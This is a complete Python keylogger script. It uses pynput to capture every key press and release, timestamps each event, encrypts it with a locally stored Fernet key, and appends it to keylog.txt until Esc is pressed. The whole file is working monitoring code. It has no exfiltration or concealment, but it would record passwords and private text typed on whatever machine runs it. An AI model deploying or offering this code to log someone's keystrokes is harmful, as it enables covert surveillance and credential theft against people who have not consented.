from pynput import keyboard 
import os 
import datetime 
from cryptography.fernet import Fernet
if not os.path.exists("key.key"):
    key = Fernet.generate_key()
    with open ("key.key", "wb") as f:
        f.write(key)
else:
    with open ("key.key", "rb") as kf:
        key=kf.read()
fernet= Fernet(key)

logfile="keylog.txt"

def log_key(key):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    fulllog= f"[{timestamp}] {key}"
    encrypt=fernet.encrypt(fulllog.encode())
    with open(logfile , "a") as f:
        f.write( encrypt.decode() +"\n ")

def on_press(key):
    try:
        log_key("key {0} pressed " .format(key.char))
    except AttributeError:
        log_key('special key {0} pressed ' .format(key))

def on_release(key):
    log_key('{0} released'.format(key))
    if key == keyboard.Key.esc:
        # Stop the  listener
        return False

# Collect of events until released
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()